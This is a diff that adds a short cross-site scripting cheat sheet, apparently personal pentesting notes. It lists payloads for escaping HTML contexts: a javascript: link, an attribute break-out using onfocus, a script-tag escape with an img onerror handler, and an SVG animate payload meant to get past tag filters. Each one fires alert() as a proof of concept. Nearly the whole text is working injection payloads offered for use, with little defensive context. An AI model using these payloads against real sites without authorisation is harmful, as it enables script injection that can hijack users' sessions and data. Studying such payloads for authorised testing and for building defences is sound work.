@@ -1,0 +1,25 @@
+Escaping HTML contexts : 
+
+
+<a href="javascript:alert(document.domain)">
+
+#in cases where the angle brackets are encoded , you can trigger an event inside an attribute to run your script and gracefully repair it back:
+" autofocus onfocus=alert(document.domain) x="
+
+In the case where the context is in a script tag , you can simply close the tag and run your script : 
+</script><img src=1 onerror=alert(document.domain)>
+
+
+
+Used to Bypass a filter that blocks some tags and attributes , you can use the following payloads to execute your script :
+
+<svg>
+	<a>
+	<animate attributeName="href" values="javascript:alert(1)"/>
+	<text x="12" y="50">
+		Click me
+	</text> 
+</a>
+</svg>
+
+
